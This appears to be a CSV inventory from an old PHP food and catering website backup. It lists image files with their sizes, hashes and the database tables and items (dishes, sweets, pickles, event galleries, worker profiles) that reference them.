2.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/2.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),website_gallery,2,Images 2,gimage
2.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/2.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),recipe_appliances_kits,2,Black Pepper Powder,kits_img
2.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/2.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),event_cuisine,2,North Indian,cuisine_img
3.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/3.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),menu_item_tbl,3,Mixed Veg Uttappam,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/3.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),product_item_tbl,3,Loose Gol Matthi,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/3.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),website_gallery,3,Images 3,gimage
3.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/3.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),recipe_appliances_kits,3,Refined Oil,kits_img
3.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/3.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),event_cuisine,3,China to India,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/6.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),product_item_tbl,6,Masala Pare,menu_img
6.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/6.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),website_gallery,6,Images 6,gimage
6.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/6.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),worke_work_experience,6,as worked at,workproimg
6.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/6.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),recipe_appliances_kits,6,Lemon,kits_img
6.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/6.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),event_cuisine,6,Mithas Dil Se,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/6.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),event_requirement,6,Good Friday,event_img
7.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/7.jpg,28601,46e6d1a9b306a55a9b92e0d8fd0b0a421ec46c2b7de9b1bb5e37515500975de4,b420791f796c69898748c9514f6ec782,DB Mapped (Verified),menu_item_tbl,7,Curd Rice,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/7.jpg,28601,46e6d1a9b306a55a9b92e0d8fd0b0a421ec46c2b7de9b1bb5e37515500975de4,b420791f796c69898748c9514f6ec782,DB Mapped (Verified),product_item_tbl,7,Pithi Kachori,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/7.jpg,28601,46e6d1a9b306a55a9b92e0d8fd0b0a421ec46c2b7de9b1bb5e37515500975de4,b420791f796c69898748c9514f6ec782,DB Mapped (Verified),worke_work_experience,7,knows these Cuisines3,workproimg
7.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/7.jpg,28601,46e6d1a9b306a55a9b92e0d8fd0b0a421ec46c2b7de9b1bb5e37515500975de4,b420791f796c69898748c9514f6ec782,DB Mapped (Verified),recipe_appliances_kits,7,Coriander Leaves,kits_img
7.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/7.jpg,28601,46e6d1a9b306a55a9b92e0d8fd0b0a421ec46c2b7de9b1bb5e37515500975de4,b420791f796c69898748c9514f6ec782,DB Mapped (Verified),event_cuisine,7,Soups & Beverages,cuisine_img
8.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/8.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),product_item_tbl,8,Sakkar Pare,menu_img
8.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/8.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),worke_work_experience,8,knows these Cuisines,workproimg
8.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/8.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),recipe_appliances_kits,8,Salt,kits_img
8.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/8.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),event_cuisine,8,Starters,cuisine_img
9.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/9.jpg,34115,ba3aa175825bc2e85d11c2382f0e7aca3ee8c74c664d4302edaf5f2283cb7d62,81585b1c6b5dc45a76fad9a82dd53bde,DB Mapped (Verified),menu_item_tbl,9,Tamarind Rice,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/9.jpg,34115,ba3aa175825bc2e85d11c2382f0e7aca3ee8c74c664d4302edaf5f2283cb7d62,81585b1c6b5dc45a76fad9a82dd53bde,DB Mapped (Verified),product_item_tbl,9,Atta Dry Fruit Laddoo,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/9.jpg,34115,ba3aa175825bc2e85d11c2382f0e7aca3ee8c74c664d4302edaf5f2283cb7d62,81585b1c6b5dc45a76fad9a82dd53bde,DB Mapped (Verified),worke_work_experience,9,knows these Cuisines2,workproimg
9.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/9.jpg,34115,ba3aa175825bc2e85d11c2382f0e7aca3ee8c74c664d4302edaf5f2283cb7d62,81585b1c6b5dc45a76fad9a82dd53bde,DB Mapped (Verified),recipe_appliances_kits,9,Green Capsicum,kits_img
.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/.jpg,8781,97e427bc17e09b0a147bf92e9466bc82d1808a098bea2231b5b0dea8428b98fb,e4a38af8ca695afdab21f88ca8c344b9,Static / Orphaned Disk Asset,,,,
10.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/10.jpg,23442,a4cc120a6178611c72152167d97a395a72250b002845b77a93fbbfbf1a6eb883,056979e13b329d80cb7e70522ca43683,DB Mapped (Verified),product_item_tbl,10,Atta Panjiri,menu_img
10.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/10.jpg,23442,a4cc120a6178611c72152167d97a395a72250b002845b77a93fbbfbf1a6eb883,056979e13b329d80cb7e70522ca43683,DB Mapped (Verified),website_gallery,10,Evevt At rishikesh,gimage
10.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/10.jpg,23442,a4cc120a6178611c72152167d97a395a72250b002845b77a93fbbfbf1a6eb883,056979e13b329d80cb7e70522ca43683,DB Mapped (Verified),worke_work_experience,10,as worked at2,workproimg
10.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/10.jpg,23442,a4cc120a6178611c72152167d97a395a72250b002845b77a93fbbfbf1a6eb883,056979e13b329d80cb7e70522ca43683,DB Mapped (Verified),recipe_appliances_kits,10,Red Bell Pepper,kits_img
11.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/11.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),menu_item_tbl,11,Dal Tadka,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/11.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),product_item_tbl,11,Balushai,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/11.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),website_gallery,11,Event at Delhi,gimage
11.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/11.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),worke_work_experience,11,North Indian Dishes by,workproimg
11.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/11.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),recipe_appliances_kits,11,Yellow Bell Pepper,kits_img
12.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/12.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),product_item_tbl,12,Besan Dry Fruit Laddo,menu_img
12.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/12.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),website_gallery,12,Event at Delhi,gimage
12.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/12.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),worke_work_experience,12,North Indian Dishes by2,workproimg
12.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/12.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),recipe_appliances_kits,12,Mushroom,kits_img
13.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/13.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),menu_item_tbl,13,Paneer Lababdar,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/13.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),product_item_tbl,13,Besan Laddo,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/13.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),website_gallery,13,Evevt At rishikesh,gimage
13.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/13.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),worke_work_experience,13,tarters Dishes by1,workproimg
13.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/13.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),recipe_appliances_kits,13,Mint Leaves,kits_img
14.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/14.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),product_item_tbl,14,Chhena Murgi,menu_img
14.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/14.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),website_gallery,14,Event at Delhi,gimage
14.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/14.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),worke_work_experience,14,tarters Dishes by12,workproimg
15.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/15.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),product_item_tbl,15,Desi Ghee Bundi,menu_img
15.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/15.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),website_gallery,15,Event at DPS school Gurugram,gimage
15.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/15.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),worke_work_experience,15,Desserts Dishes by1,workproimg
16.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/16.jpg,23442,a4cc120a6178611c72152167d97a395a72250b002845b77a93fbbfbf1a6eb883,056979e13b329d80cb7e70522ca43683,DB Mapped (Verified),product_item_tbl,16,Desi Ghee Bundi Ladoo,menu_img
16.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/16.jpg,23442,a4cc120a6178611c72152167d97a395a72250b002845b77a93fbbfbf1a6eb883,056979e13b329d80cb7e70522ca43683,DB Mapped (Verified),website_gallery,16,Event at DPS school Gurugram,gimage
16.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/16.jpg,23442,a4cc120a6178611c72152167d97a395a72250b002845b77a93fbbfbf1a6eb883,056979e13b329d80cb7e70522ca43683,DB Mapped (Verified),worke_work_experience,16,Desserts Dishes by3,workproimg
17.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/17.jpg,24262,8dafc87ca528f50ee91c853fbcbf94467e8e99ebdaa015915b5129be5c13cca7,ae0e7d46a66796a2f431f5851e72c7e8,DB Mapped (Verified),product_item_tbl,17,Desi Ghee Gujia,menu_img
17.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/17.jpg,24262,8dafc87ca528f50ee91c853fbcbf94467e8e99ebdaa015915b5129be5c13cca7,ae0e7d46a66796a2f431f5851e72c7e8,DB Mapped (Verified),website_gallery,17,Event at DPS school Gurugram,gimage
17.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/17.jpg,24262,8dafc87ca528f50ee91c853fbcbf94467e8e99ebdaa015915b5129be5c13cca7,ae0e7d46a66796a2f431f5851e72c7e8,DB Mapped (Verified),worke_work_experience,17,Desserts Dishes by2,workproimg
18.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/18.jpg,34115,ba3aa175825bc2e85d11c2382f0e7aca3ee8c74c664d4302edaf5f2283cb7d62,81585b1c6b5dc45a76fad9a82dd53bde,DB Mapped (Verified),menu_item_tbl,18,Aloo Gobhi,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/18.jpg,34115,ba3aa175825bc2e85d11c2382f0e7aca3ee8c74c664d4302edaf5f2283cb7d62,81585b1c6b5dc45a76fad9a82dd53bde,DB Mapped (Verified),product_item_tbl,18,Desi Ghee Patisha,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/18.jpg,34115,ba3aa175825bc2e85d11c2382f0e7aca3ee8c74c664d4302edaf5f2283cb7d62,81585b1c6b5dc45a76fad9a82dd53bde,DB Mapped (Verified),website_gallery,18,event at noida,gimage
18.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/18.jpg,34115,ba3aa175825bc2e85d11c2382f0e7aca3ee8c74c664d4302edaf5f2283cb7d62,81585b1c6b5dc45a76fad9a82dd53bde,DB Mapped (Verified),worke_work_experience,18,reakfast Dishes by2,workproimg
19.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/19.jpg,15368,75a04757bdbcc5a7f0eab96f17abff857439b0a601dad4445b88d95cfed32cb7,e1b039a80d164f1dda504b83e8d2254b,DB Mapped (Verified),product_item_tbl,19,Dry Fruit Patisha,menu_img
19.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/19.jpg,15368,75a04757bdbcc5a7f0eab96f17abff857439b0a601dad4445b88d95cfed32cb7,e1b039a80d164f1dda504b83e8d2254b,DB Mapped (Verified),website_gallery,19,Event at Delhi,gimage
19.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/19.jpg,15368,75a04757bdbcc5a7f0eab96f17abff857439b0a601dad4445b88d95cfed32cb7,e1b039a80d164f1dda504b83e8d2254b,DB Mapped (Verified),worke_work_experience,19,reakfast Dishes by1,workproimg
20.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/20.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),product_item_tbl,20,Karachi Halwai,menu_img
20.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/20.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),website_gallery,20,Event at Ghaziabadh,gimage
20.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/20.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),worke_work_experience,20,Chinese Dishes by,workproimg
21.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/21.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),product_item_tbl,21,Meva Panjiri,menu_img
21.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/21.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),website_gallery,21,Event at Ghaziabadh,gimage
21.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/21.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),worke_work_experience,21,Chinese Dishes by 2,workproimg
22.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/22.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),menu_item_tbl,22,Kheer,menu_img
22.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/22.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),product_item_tbl,22,Kathal ka Achaar,menu_img
23.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/23.jpg,6643,80ef03a96583f22be9ec7b540bdec0abbf197baba8ce6b9edcca223d7f57cf63,423af634868e8119dd9befb099f3db1b,DB Mapped (Verified),menu_item_tbl,23,Tomato Basil Soup,menu_img
23.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/23.jpg,6643,80ef03a96583f22be9ec7b540bdec0abbf197baba8ce6b9edcca223d7f57cf63,423af634868e8119dd9befb099f3db1b,DB Mapped (Verified),menu_item_tbl,23,Tomato Basil Soup,menu_small_img
23.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/23.jpg,6643,80ef03a96583f22be9ec7b540bdec0abbf197baba8ce6b9edcca223d7f57cf63,423af634868e8119dd9befb099f3db1b,DB Mapped (Verified),product_item_tbl,23,Lal Mirch ka Bharua Achar,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/24.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/24.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_small_img
24.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/24.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),product_item_tbl,24,Aam ka Achar,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/24.jpg,15877,a1c88a324bca5e9ff314ab56cdc78d0baf27a3e4e43cd162e2f380f5d2199098,43a6358351623e267fe3148d869ad71a,DB Mapped (Verified),website_gallery,24,Amritsari Kulcha,gimage
25.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/25.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),product_item_tbl,25,Hari bhri Mirchi,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/26.jpg,27371,665f10c6e7484b99bd13503deb5b2283d35b5956e44aaeea74cb38dda8b28f0a,006b8a06391c266628ab4fb322cf8dc2,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/26.jpg,27371,665f10c6e7484b99bd13503deb5b2283d35b5956e44aaeea74cb38dda8b28f0a,006b8a06391c266628ab4fb322cf8dc2,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_small_img
26.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/26.jpg,27371,665f10c6e7484b99bd13503deb5b2283d35b5956e44aaeea74cb38dda8b28f0a,006b8a06391c266628ab4fb322cf8dc2,DB Mapped (Verified),product_item_tbl,26,Ginger Garlic Pickle,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/26.jpg,27371,665f10c6e7484b99bd13503deb5b2283d35b5956e44aaeea74cb38dda8b28f0a,006b8a06391c266628ab4fb322cf8dc2,DB Mapped (Verified),worke_work_experience,26,cuisine,workproimg
27.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/27.jpg,39669,4a1da8d6975dc5b28b5d5a7464d05e91697c0f37ddf9818c4aa76a8080eee1c2,af39de6fb76489f10d81c9f8153ab321,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_img
27.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/27.jpg,39669,4a1da8d6975dc5b28b5d5a7464d05e91697c0f37ddf9818c4aa76a8080eee1c2,af39de6fb76489f10d81c9f8153ab321,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_small_img
27.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/27.jpg,39669,4a1da8d6975dc5b28b5d5a7464d05e91697c0f37ddf9818c4aa76a8080eee1c2,af39de6fb76489f10d81c9f8153ab321,DB Mapped (Verified),product_item_tbl,27,Chilli Mix Pickle,menu_img
27.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/27.jpg,39669,4a1da8d6975dc5b28b5d5a7464d05e91697c0f37ddf9818c4aa76a8080eee1c2,af39de6fb76489f10d81c9f8153ab321,DB Mapped (Verified),worke_work_experience,27,north indian,workproimg
28.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/28.jpg,37613,3af7e6c7a84969927707b1b5ea58291ad284dfef44bab3a0d25a7a8c765fa035,045591c3f983fd33c05d54f464d38272,DB Mapped (Verified),product_item_tbl,28,Tomato chutney,menu_img
6.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/6.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),product_item_tbl,6,Masala Pare,menu_img
6.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/6.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),website_gallery,6,Images 6,gimage
6.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/6.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),worke_work_experience,6,as worked at,workproimg
6.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/6.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),recipe_appliances_kits,6,Lemon,kits_img
6.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/6.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),event_cuisine,6,Mithas Dil Se,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/6.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),event_requirement,6,Good Friday,event_img
7.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/7.jpg,24262,8dafc87ca528f50ee91c853fbcbf94467e8e99ebdaa015915b5129be5c13cca7,ae0e7d46a66796a2f431f5851e72c7e8,DB Mapped (Verified),menu_item_tbl,7,Curd Rice,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/7.jpg,24262,8dafc87ca528f50ee91c853fbcbf94467e8e99ebdaa015915b5129be5c13cca7,ae0e7d46a66796a2f431f5851e72c7e8,DB Mapped (Verified),product_item_tbl,7,Pithi Kachori,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/7.jpg,24262,8dafc87ca528f50ee91c853fbcbf94467e8e99ebdaa015915b5129be5c13cca7,ae0e7d46a66796a2f431f5851e72c7e8,DB Mapped (Verified),worke_work_experience,7,knows these Cuisines3,workproimg
7.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/7.jpg,24262,8dafc87ca528f50ee91c853fbcbf94467e8e99ebdaa015915b5129be5c13cca7,ae0e7d46a66796a2f431f5851e72c7e8,DB Mapped (Verified),recipe_appliances_kits,7,Coriander Leaves,kits_img
7.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/7.jpg,24262,8dafc87ca528f50ee91c853fbcbf94467e8e99ebdaa015915b5129be5c13cca7,ae0e7d46a66796a2f431f5851e72c7e8,DB Mapped (Verified),event_cuisine,7,Soups & Beverages,cuisine_img
8.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/8.jpg,54382,2e4b2c684650bb20cf1798f8b2faa7808d1e034bbc7141a2b85bbaa77cd7fa8a,967f3ef50775bee3f24c11c76d234180,DB Mapped (Verified),product_item_tbl,8,Sakkar Pare,menu_img
8.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/8.jpg,54382,2e4b2c684650bb20cf1798f8b2faa7808d1e034bbc7141a2b85bbaa77cd7fa8a,967f3ef50775bee3f24c11c76d234180,DB Mapped (Verified),worke_work_experience,8,knows these Cuisines,workproimg
8.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/8.jpg,54382,2e4b2c684650bb20cf1798f8b2faa7808d1e034bbc7141a2b85bbaa77cd7fa8a,967f3ef50775bee3f24c11c76d234180,DB Mapped (Verified),recipe_appliances_kits,8,Salt,kits_img
8.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/8.jpg,54382,2e4b2c684650bb20cf1798f8b2faa7808d1e034bbc7141a2b85bbaa77cd7fa8a,967f3ef50775bee3f24c11c76d234180,DB Mapped (Verified),event_cuisine,8,Starters,cuisine_img
9.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/9.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),menu_item_tbl,9,Tamarind Rice,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/workerimage/9.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),product_item_tbl,9,Atta Dry Fruit Laddoo,menu_img
